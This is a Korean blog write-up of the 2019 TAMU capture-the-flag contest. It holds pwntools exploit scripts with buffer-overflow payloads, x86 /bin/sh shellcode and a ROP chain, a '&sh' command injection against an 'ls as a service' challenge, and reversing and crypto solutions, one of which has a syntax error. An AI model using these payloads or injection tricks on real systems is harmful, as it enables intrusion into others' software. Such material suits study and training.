---
title: "2019 Tamu CTF Writeup"
date: 2019-3-4
tags: [CTF]
categories: [CTF]
---

혼자 참여해서 2472팀중에 348등 5061 points로 끝냈고 22문제를 풀었다.

![](https://user-images.githubusercontent.com/32904385/53815727-84b32f00-3fa5-11e9-8e3a-743d37f589a9.png)

# Pwnable

포..넙

### Pwn1

```python
from pwn import *

# p = remote('pwn.tamuctf.com',4321)
p = process('./pwn1')
e = ELF('./pwn1')
shell=0xDEA110C8
p.sendlineafter('What... is your name?','Sir Lancelot of Camelot')
p.sendlineafter('What... is your quest?','To seek the Holy Grail.')
p.recvuntil('What... is my secret?')
payload = ''
payload += 'A'*(0x3b-0x10)
payload += p32(shell)
p.sendline(payload)
p.interactive()
```

**FLAG : gigem{34sy_CC428ECD75A0D392}**

<br />

### Pwn2

```python
from pwn import *

# p = remote('pwn.tamuctf.com',4322)
p = process('./pwn2')
e = ELF('./pwn2')
flag_fun=0x000006d8
p.recvuntil('Which function would you like to call?')
payload = 'A'*30
payload += p32(flag_fun)
p.sendline(payload)
p.interactive()
```

**FLAG : gigem{4ll_17_74k35_15_0n3}**

<br />

### Pwn3

```python
from pwn import *

# p = remote('pwn.tamuctf.com',4323)
p = process('./pwn3')
e = ELF('./pwn3')

sh = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80"
p.recvuntil('Take this, you might need it on your journey ')
add = int(p.recv(10),0)
payload=''
payload += sh
payload += 'A'*(302-len(sh))
payload += p32(add)
p.sendline(payload)
p.interactive()
```

**FLAG : gigem{r3m073_fl46_3x3cu710n}**

<br />

### Pwn4

Pwn4와 Pwn5는 그냥 살짝 쉽게 푸는 법이 있는데 이게 `Enter the arguments you would like to pass to ls:` 이후에 몇 바이트만 받는데 약 4? 5인가? 이게 ls명령어를 실행하니까 `&sh` 로 쉘을 딸 수 있었다. 

ex 1)

```python
from pwn import *

# p = remote('pwn.tamuctf.com',4324)
p = process('./pwn4')
e = ELF('./pwn4')

gets_plt=e.plt['gets']
system_plt=e.plt['system']
pr_add=0x80486DB

p.recvuntil('Enter the arguments you would like to pass to ls:')
payload=''
payload+='A'*37
payload+=p32(gets_plt)
payload+=p32(pr_add)
payload+=p32(e.bss())

payload+=p32(system_plt)
payload+='A'*4
payload+=p32(e.bss())

p.sendline(payload)
p.sendline('/bin/sh\x00')
sleep(0.5)
p.interactive()
```

ex 2)

```sh
$ nc pwn.tamuctf.com 4324
ls as a service (laas)(Copyright pending)
Enter the arguments you would like to pass to ls:
&sh
Result of ls &sh:
flag.txt
pwn4
cat flag.txt
gigem{5y573m_0v3rfl0w}
```

**FLAG : gigem{5y573m_0v3rfl0w}**

<br />

### Pwn5

""**감**""... 

```sh
$ nc pwn.tamuctf.com 4325
ls as a service (laas)(Copyright pending)
Version 2: Less secret strings and more portable!
Enter the arguments you would like to pass to ls:
&sh
Result of ls &sh:
flag.txt
pwn5
cat flag.txt
gigem{r37urn_0r13n73d_pr4c71c3}
```

**FLAG : gigem{r37urn_0r13n73d_pr4c71c3}**

<br />

## Reversing

이지한데 어려운건 너무 어려웠다.

### Cheesy

Base64 느낌의 인코딩이 많은거 같아서 그냥 다 디코딩해주었다. 그 중에서 플래그가 있었다.

```python
import base64
print base64.b64decode('Z2lnZW17M2E1eV9SM3YzcjUxTjYhfQ==')
```

**FLAG : gigem{3a5y_R3v3r51N6!}**

<br />

### Snakes over cheese

pyc 파일이 주어져서 디컴파일해주었다. 그냥 시계는 의미없고 table1의 값을 다 문자로 바꾸어주었더니 플래그가 나왔다.

```python
table1 = [
 102, 108, 97, 103, 123, 100, 101, 99, 111, 109, 112, 105, 108, 101, 125]
```

**FLAG : gigem{decompile}**

<br />

### 042

.s파일이 주어졌다. at&t 문법이였다. 평소에 Intel만 사용해서 그런지 거꾸로 대입해야했다. 일단 L_.str.2 에서 플래그를 출력해주는 거 같았다. 근데 문제가 너무 간단하게 rbp-16 ~ rbp-9까지 넣은 값이 gigem("%s") 안에 들어간다. 저 값들을 문자열로 바꾸어주면 된다.

```assembly
movb	$65, -16(%rbp)
movb	$53, -15(%rbp)
movb	$53, -14(%rbp)
movb	$51, -13(%rbp)
movb	$77, -12(%rbp)
movb	$98, -11(%rbp)
movb	$49, -10(%rbp)
movb	$89, -9(%rbp)
```

**FLAG : gigem{A553Mb1Y}**

<br />

### KeyGenMe

그냥 브루트포스 코드짜서 돌렸다. 값은 무수히 많았다. 근데 마지막에 막혀서 아쉬운게 분석해보면 마지막에 한글자가 더 붙어서 나오는데 한글자 빼고 값을 넣어줘야 ` [OIonU2_<__nK<KsK` 이 값이 나온다. ㅠㅠ 

**FLAG : gigem{k3y63n_m3?_k3y63n_y0u!}**

<br />

### Cr4ckZ33C0d3

파이썬 모듈 z3와 angr를 활용해서 풀 수 있는 문제였다. 이거에서 시간 좀 많이 쓴듯하다.

```python
import angr
from pwn import *

p=angr.Project("./prodkey",load_options={'auto_load_libs':True})
ex=p.surveyors.Explorer(find=(0x400e7f,),avoid=(0x400ead,))
ex.run()
#print ex.found[0].state.posix.dumps(3)
key = ex.found[0].state.posix.dumps(3)
e = process('./prodkey')
#e = remote('rev.tamuctf.com',8189)
e.sendlineafter('Please Enter a product key to continue:',key)
e.interactive()
```

<br />

### NoCCBytes

이건 소스가 좀 긴데 그냥 마지막에 passCheck해주는 부분을 보면 전역변수 globPass라는 변수와 xor해주길래 그냥 브루트포스 돌렸다. 그 중에서 그나마 그럴싸한 `WattoSays` 가 password인 거 같아서 넣어줬는데 맞았다.

![](https://user-images.githubusercontent.com/32904385/53345200-b26df780-3957-11e9-8fbf-c96d3bdfda69.png)

**FLAG : gigem{Y0urBreakpo1nt5Won7Work0nMeOnlyMon3y}**

<br />

# Android

### Secrets

howdyapp.apk라는 파일이 주어진다. 디컴파일 해주고 strings보니까 base64 인코딩된 문자가 있어서 디코드 해주었다.

![](https://user-images.githubusercontent.com/32904385/53345460-9028a980-3958-11e9-96ba-49ccb2db738b.png)

**FLAG : gigem{infinite_gigems}**

<br />

# Crypto

### -.-

엄청난 양의 Morse Code가 있어서 코드짜서 그냥 쉽게 돌려주었다. 그러면 엄청난 양의 16진수가 나오는데 iHex에 붙여넣기 했더니 끝 부분에 플래그가 있었다.

```python
table = "dah-dah-dah-dah-dah dah-di-di-dah di-di-di-di-dit dah-dah-di-di-dit dah-dah-di-di-dit dah-dah-dah-dah-dah di-di-dah-dah-dah di-dah dah-di-di-di-dit dah-di-dah-dit di-di-di-di-dit dah-dah-dah-di-dit dah-dah-di-di-dit di-di-di-di-dah di-di-di-di-dah dah-dah-di-di-dit di-di-di-di-dit di-dah-dah-dah-dah di-di-di-dah-dah dah-dah-dah-di-dit dah-di-di-di-dit di-di-di-di-dit di-di-di-dah-dah dah-dah-dah-di-dit dah-dah-di-di-dit di-dah-dah-dah-dah dah-di-di-di-dit dit dah-di-di-di-dit dah-di-dit di-di-di-di-dah dah-di-dit di-di-di-di-dit dah-dah-dah-dah-dit di-di-di-di-dit di-di-di-di-dit di-di-dah-dah-dah di-dah dah-dah-di-di-dit di-di-di-dah-dah dah-dah-di-di-dit dah-di-di-di-dit di-di-di-di-dah dah-di-di-di-dit di-di-di-di-dah dah-dah-dah-di-dit dah-di-di-di-dit dah-di-di-dit dah-di-di-di-dit di-dah di-di-di-di-dah dah-dah-dah-dah-dit dah-dah-di-di-dit di-di-di-di-dah di-di-dah-dah-dah di-dah di-di-di-di-dit di-di-dah-dah-dah di-di-di-di-dit di-dah-dah-dah-dah di-di-dah-dah-dah dah-di-di-di-dit di-di-di-di-dah di-dah dah-dah-di-di-dit dah-dah-dah-dah-dah di-di-di-di-dit di-dah dah-dah-di-di-dit dah-di-di-di-dit dah-di-di-di-dit di-dah dah-di-di-di-dit dah-di-dit di-di-dah-dah-dah di-dah-dah-dah-dah di-di-dah-dah-dah di-di-di-di-dit di-di-dah-dah-dah di-di-di-di-dit di-di-di-di-dah dah-di-di-dit di-di-di-di-dah di-di-di-di-dah dah-di-di-di-dit dah-di-di-dit dah-di-di-di-dit dah-di-di-di-dit dah-dah-di-di-dit dah-dah-dah-dah-dah di-di-dah-dah-dah di-di-di-dah-dah di-di-di-di-dit dit di-di-di-di-dah dit di-di-di-dah-dah dah-dah-dah-dah-dit dah-di-di-di-dit dah-di-di-di-dit dah-di-di-di-dit dah-di-di-dit di-di-di-dah-dah di-di-di-di-dah dah-di-di-di-dit di-di-di-di-dah di-di-di-di-dit di-di-di-di-dit di-di-di-dah-dah di-di-di-di-dah dah-di-di-di-dit dah-di-dah-dit di-di-di-di-dah di-di-dah-dah-dah di-di-di-dah-dah di-di-di-dah-dah dah-dah-di-di-dit di-di-dah-dah-dah di-di-di-di-dit di-di-di-di-dah dah-di-di-di-dit di-di-dah-dit di-di-di-di-dit di-di-di-di-dah di-di-di-dah-dah dah-dah-dah-dah-dah di-di-di-di-dit dah-dah-dah-dah-dah di-di-di-di-dit di-dah di-di-di-di-dit di-dah-dah-dah-dah dah-di-di-di-dit dah-di-dit di-di-di-di-dah di-di-di-dah-dah di-di-di-di-dit di-dah-dah-dah-dah di-di-di-di-dah di-di-di-di-dit di-di-di-di-dah dah-di-di-dit di-di-di-di-dit dah-dah-dah-dah-dit di-di-di-di-dah di-di-dah-dah-dah di-di-di-dah-dah di-di-di-di-dah di-di-di-di-dit di-dah di-di-di-di-dah dah-di-dit dah-dah-di-di-dit dah-di-di-di-dit di-di-dah-dah-dah di-dah di-di-dah-dah-dah di-dah-dah-dah-dah di-di-di-di-dah dah-di-di-di-dit dah-di-di-di-dit dah-di-di-dit di-di-di-dah-dah dah-dah-dah-di-dit dah-di-di-di-dit dah-di-dah-dit di-di-dah-dah-dah di-di-di-di-dit dah-di-di-di-dit di-di-dah-dah-dah dah-di-di-di-dit di-dah dah-dah-di-di-dit di-dah-dah-dah-dah dah-di-di-di-dit dah-di-dah-dit di-di-di-di-dit dah-dah-dah-dah-dah di-di-di-di-dah dah-di-dit dah-di-di-di-dit dah-di-di-di-dit di-di-di-di-dah dah-dah-dah-dah-dit di-di-di-di-dah dah-dah-di-di-dit dah-di-di-di-dit dah-di-dit dah-di-di-di-dit di-dah-dah-dah-dah di-di-dah-dah-dah di-di-di-di-dit di-di-dah-dah-dah di-di-di-di-dit di-di-di-di-dah dah-di-di-di-dit dah-dah-di-di-dit di-dah di-di-di-di-dah dah-dah-di-di-dit di-di-dah-dah-dah dah-dah-dah-dah-dah dah-di-di-di-dit dah-dah-di-di-dit dah-di-di-di-dit dah-dah-dah-dah-dit dah-di-di-di-dit dah-dah-di-di-dit dah-di-di-di-dit di-di-di-di-dit dah-di-di-di-dit dah-di-dit dah-dah-di-di-dit dah-di-di-dit di-di-di-di-dah di-di-di-dah-dah di-di-di-dah-dah di-dah-dah-dah-dah dah-di-di-di-dit dah-dah-dah-dah-dit dah-di-di-di-dit di-di-di-dah-dah di-di-di-di-dah dah-di-di-dit di-di-di-di-dit di-di-dah-dit dah-di-di-di-dit di-di-di-dah-dah dah-di-di-di-dit dah-di-dah-dit di-di-di-dah-dah di-dah-dah-dah-dah di-di-di-di-dah di-di-di-dah-dah di-di-di-di-dah dah-di-di-dit di-di-dah-dah-dah dah-di-dit dah-dah-di-di-dit dah-dah-dah-dah-dit di-di-di-dah-dah dah-dah-dah-dah-dah dah-dah-di-di-dit di-di-di-di-dit di-di-di-di-dit di-di-dah-dit dah-di-di-di-dit dah-dah-dah-di-dit di-di-di-dah-dah di-di-di-di-dah dah-dah-di-di-dit dah-di-di-di-dit di-di-di-dah-dah di-di-di-dah-dah di-di-di-di-dit di-di-dah-dit dah-di-di-di-dit dah-di-dit di-di-di-dah-dah di-di-di-di-dah di-di-di-di-dah dah-dah-dah-dah-dit di-di-di-dah-dah di-dah-dah-dah-dah dah-dah-di-di-dit dah-di-dit di-di-dah-dah-dah dah-dah-dah-dah-dah dah-dah-di-di-dit di-di-di-di-dit dah-dah-di-di-dit dah-di-di-di-dit di-di-di-dah-dah di-di-di-di-dah dah-dah-di-di-dit dah-di-di-di-dit dah-dah-di-di-dit di-dah di-di-di-di-dah dah-di-di-dit di-di-di-di-dit di-dah dah-dah-di-di-dit di-di-di-di-dah di-di-di-dah-dah di-di-di-di-dah dah-dah-di-di-dit dah-dah-dah-dah-dit dah-di-di-di-dit di-di-dah-dit dah-di-di-di-dit dah-di-dit dah-di-di-di-dit dah-dah-dah-dah-dit di-di-di-di-dah di-di-di-di-dah di-di-di-di-dit di-di-di-dah-dah dah-di-di-di-dit dah-dah-dah-di-dit di-di-di-di-dah dah-di-dah-dit dah-di-di-di-dit dah-di-dit di-di-di-dah-dah dah-dah-dah-di-dit di-di-di-di-dit di-dah-dah-dah-dah di-di-di-di-dah di-di-di-di-dit di-di-di-di-dah dah-di-di-di-dit dah-di-di-di-dit dit di-di-di-di-dit di-di-di-di-dit dah-dah-di-di-dit di-di-di-di-dah dah-dah-di-di-dit dah-dah-di-di-dit di-di-di-di-dah di-dah di-di-di-di-dah dah-dah-dah-dah-dah di-di-di-di-dah dit dah-dah-di-di-dit di-di-di-di-dit di-di-di-di-dah di-di-dah-dit di-di-di-di-dit dah-dah-dah-dah-dit dah-di-di-di-dit dah-di-di-di-dit di-di-di-di-dit dah-dah-dah-di-dit di-di-dah-dah-dah dah-di-di-di-dit di-di-di-dah-dah dah-dah-dah-di-dit dah-dah-di-di-dit di-di-di-di-dit di-di-di-di-dah dah-dah-dah-dah-dah di-di-di-di-dah dah-dah-di-di-dit dah-di-di-di-dit dit di-di-dah-dah-dah di-dah-dah-dah-dah di-di-di-dah-dah di-dah-dah-dah-dah di-di-dah-dah-dah di-di-di-di-dit di-di-di-di-dit di-di-di-di-dah dah-dah-di-di-dit di-dah-dah-dah-dah dah-dah-di-di-dit dah-di-di-di-dit di-di-di-dah-dah dah-dah-dah-dah-dah di-di-di-di-dit dah-di-di-di-dit dah-di-di-di-dit di-di-di-dah-dah di-di-di-di-dit di-di-dah-dah-dah dah-dah-di-di-dit di-dah di-di-di-di-dit dah-di-di-di-dit di-di-dah-dah-dah di-dah-dah-dah-dah dah-di-di-di-dit di-dah di-di-dah-dah-dah di-dah-dah-dah-dah dah-dah-di-di-dit dah-di-di-di-dit dah-dah-di-di-dit di-di-di-di-dit dah-dah-di-di-dit di-di-di-di-dit dah-dah-di-di-dit dah-dah-dah-dah-dah di-di-di-dah-dah dah-dah-dah-di-dit di-di-di-di-dah di-di-dah-dah-dah dah-di-di-di-dit di-dah dah-di-di-di-dit di-di-di-di-dah di-di-di-di-dah dit di-di-di-di-dah dah-dah-dah-dah-dit dah-dah-di-di-dit di-dah-dah-dah-dah di-di-di-di-dah di-di-di-di-dit di-di-di-dah-dah di-di-di-di-dit dah-dah-di-di-dit dah-dah-di-di-dit di-di-dah-dah-dah di-di-di-dah-dah di-di-dah-dah-dah di-di-di-di-dah di-di-dah-dah-dah di-di-di-di-dit di-di-di-di-dit dah-di-di-di-dit di-di-di-dah-dah di-di-di-di-dah di-di-di-di-dit di-di-di-di-dit di-di-di-di-dit di-dah di-di-di-di-dah di-di-dah-dit di-di-di-di-dit dah-dah-dah-dah-dit di-di-di-di-dit di-dah di-di-di-dah-dah di-di-dah-dah-dah dah-dah-di-di-dit di-dah di-di-di-dah-dah dah-dah-di-di-dit di-di-di-di-dit di-di-di-di-dah di-di-di-dah-dah di-di-dah-dah-dah di-di-di-dah-dah di-di-di-di-dit dah-dah-di-di-dit di-di-di-di-dah di-di-di-dah-dah dah-dah-di-di-dit di-di-dah-dah-dah dah-di-di-di-dit dah-dah-di-di-dit dah-dah-dah-di-dit di-di-di-di-dah dah-di-dah-dit di-di-di-di-dah dah-dah-dah-dah-dah di-di-di-di-dit dah-dah-di-di-dit di-di-di-di-dah di-di-dah-dit di-di-di-dah-dah dah-dah-di-di-dit di-di-di-dah-dah di-di-di-di-dah di-di-di-dah-dah di-dah-dah-dah-dah di-di-di-dah-dah dah-dah-dah-dah-dah di-di-di-di-dit di-dah-dah-dah-dah di-di-di-di-dah dah-dah-dah-dah-dit"
table = table.split(' ')

solve = {
	"dah-dah-dah-dah-dah" : '0',
	"di-dah-dah-dah-dah" : '1',
	"di-di-dah-dah-dah" : '2',
	"di-di-di-dah-dah" : '3',
	"di-di-di-di-dah" : '4',
	"di-di-di-di-dit" : '5',
	"dah-di-di-di-dit" : '6',
	"dah-dah-di-di-dit" : '7',
	"dah-dah-dah-di-dit" : '8',
	"dah-dah-dah-dah-dit" : '9',
	"di-dah" : 'A',
	"dah-di-di-dit" : 'B',
	"dah-di-dah-dit" : 'C',
	"dah-di-dit" : 'D',
	"dit" : 'E',
	"di-di-dah-dit" : 'F'
    "dah-di-di-dah" : 'X',
}
flag=""
#print solve
for i in range(len(table)):
	for j in table:
		flag += solve[j]
print flag
```

**FLAG : gigem{C1icK_cl1CK-y0u_h4v3_m4I1}**

<br />

그 외 다른 문제들은 안 쓰겠다. ㅎㅅㅎ